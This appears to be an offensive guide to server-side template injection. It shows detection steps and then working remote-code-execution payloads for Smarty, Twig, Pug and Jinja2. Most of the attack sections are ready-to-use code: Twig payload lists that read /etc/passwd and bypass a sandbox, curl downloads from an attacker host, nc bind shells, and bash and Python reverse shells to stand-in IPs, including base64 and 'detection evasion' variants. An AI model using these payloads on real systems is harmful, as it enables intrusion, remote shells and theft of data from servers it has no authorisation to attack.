![project ssti](identification.png)

## Identifying Server-Side Template Injection (SSTI)

We can use a automated tool to find SSTI for us https://github.com/vladko312/SSTImap.git

SSTI can be identified by injecting simple template expressions and observing how the server processes them. A common first test is an arithmetic expression like *${7*7}* or *{{7*7}}*.
Follow the green lines if the payload worked or follow red line.
If the response evaluates to 49, template execution is likely occurring.

If the expression is rendered as plain text, the input is probably not vulnerable.

Further payloads using template-specific syntax (such as comments {* *}, string operations, or function calls) help narrow down the template engine (e.g., Smarty, Jinja2, Twig).
The image above illustrates a step-by-step decision flow to detect SSTI and identify the underlying template engine.


## PHP - Smarty

After confirming that the payload *${7*7}* is evaluated (returns 49), we can attempt template-specific payloads to identify the engine and confirm exploitation.

Smarty supports modifiers, such as upper:
```
{'Hello'|upper}
```
If the output is returned in uppercase (HELLO), this strongly indicates Smarty.

To further confirm and demonstrate impact, we can attempt command execution using the system function:
```
{system("id")}
```
If this returns system user information, it clearly confirms Smarty SSTI with command execution capability
.
## RCE – Smarty

Create a Bash reverse shell based on the binaries available on the target and save it as shell.sh:
```
#!/bin/bash

/bin/bash -i >& /dev/tcp/<attacker-ip>/1234 0>&1
```

Use curl to download the reverse shell from your Python HTTP server:
```
{system('curl http://<attacker-ip>:8000/shell.sh -o /tmp/shell.sh')}
```

Start the listener on the attacker machine and execute the script to obtain a reverse shell.

## TWIG(PHP)
After identification, we can try the following payloads to perform RCE:

```
{{['id','']|sort('passthru')}}
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}

{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0

{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
```

After confirming which payload works, we can get a shell by creating a bind shell:

```
{{['rm+-f+/tmp/f;+mkfifo+/tmp/f;+cat+/tmp/f+|+/bin/sh+-i+2>&1+|+nc+-l+0.0.0.0+1234+>+/tmp/f','']|sort('passthru')}}

```
Connect using: 
```
nc <target-ip> 1234 
```
Note: The shell method should be adjusted based on the target environment, available binaries, and network restrictions.

## Node.js – Pug (Jade)

Server-Side Template Injection (SSTI) in Pug can be identified by testing JavaScript interpolation.
A common detection payload is:
```
#{7*7}

```
If the expression is evaluated and returns 49, it indicates that Pug (formerly Jade) is in use, as Pug allows direct JavaScript execution inside #{}.

## Command Execution

Since Pug templates execute JavaScript, we can leverage Node.js internals to execute system commands.
A basic payload to list files is:
```
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

```
If this returns output, command execution is confirmed.
```
## Why spawnSync('ls -lah') Does Not Work
```
Using:

spawnSync('ls -lah')

does not work as expected because spawnSync does not split a single string into a command and its arguments. Instead, it treats the entire string as the command name, which causes execution to fail.

## The correct function signature is:
```
spawnSync(command, [args], [options])
```

command: the executable to run (string)

args: an array of arguments

options: optional execution settings

## Correct Payload with Arguments

To properly execute ls -lah, the command and arguments must be separated:
```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

```
If successful, this confirms Pug SSTI leading to arbitrary command execution.

## jinja2
Inject a basic Jinja2 syntax like {{7*7}} to check for template processing. If the application returns 49, it indicates that Jinja2 is processing the template.

Output is 49 using the above payload

Once Jinja2's use is confirmed, we can the use the payload 
```
{{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.Popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
A common technique is to enumerate all subclasses of object to locate classes related to process execution (such as subprocess.Popen).

Enumerating subclasses
```
{{ "". __class__.__mro__[1].__subclasses__() }}
```
### Explanation:

"" → creates a string object

.__class__ → <class 'str'>

.__mro__ → method resolution order ([str, object])

.__mro__[1] → <class 'object'>

.__subclasses__() → returns all loaded subclasses of object

This output is a list containing many internal Python classes, including those related to process execution, such as *subprocess.Popen*.

### Finding the index of subprocess.Popen

Since __subclasses__() returns a list, each class has an index.
You must identify the index of subprocess.Popen manually from the output.

Example (index will vary by environment):
```
{{ "". __class__.__mro__[1].__subclasses__()[396] }}
```
## Why check_output('ls -lah') Does Not Work
When you use check_output('ls -lah'), you're passing the entire command and its arguments as a single string. This is not the recommended way to use check_output because it does not parse the string into a command and separate arguments. Instead, it treats the whole string as a single command to execute, which it cannot resolve as a valid executable and thus fails to run.

This method of passing arguments can potentially lead to shell injection vulnerabilities if user-controlled strings are concatenated directly into the command string. By requiring commands and their arguments to be passed as a list, check_output minimizes this risk.

```
subprocess.check_output([command, arg1, arg2])
```
command: A string that specifies the command to execute.
arg1, arg2, ...: Additional arguments that should be passed to the command.

## Correct Usage of check_output
To properly execute the ls command with options using check_output, you should pass the command and its arguments as separate elements in a list:
```
subprocess.check_output(['ls', '-lah'])
```
The list ['ls', '-lah'] contains the command ls and its argument -lah. The command is clearly separated from its arguments, which ensures that each part is correctly handled as intended. So the final payload will then be 
```
{{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

## Reverse Shell via subprocess.Popen

Reverse Shell Payload
```
{{request.application.__globals__.__builtins__.__import__('subprocess').Popen(["bash","-c","bash -i >& /dev/tcp/<attacker-ip><port> 0>&1"])}}
```

## Listener Setup
```
nc -lvnp <port>
```
## Why This Works
```
subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"]) executes:
```

### Base64 Encoded:
```
args = ["bash", "-c", "echo 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1' | base64 -d | bash"]
```
### Multi-stage:
```
args = ["bash", "-c", "bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"]
```
### Detection Evasion

Netcat	nc -e /bin/bash IP PORT
```
Python	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'
```
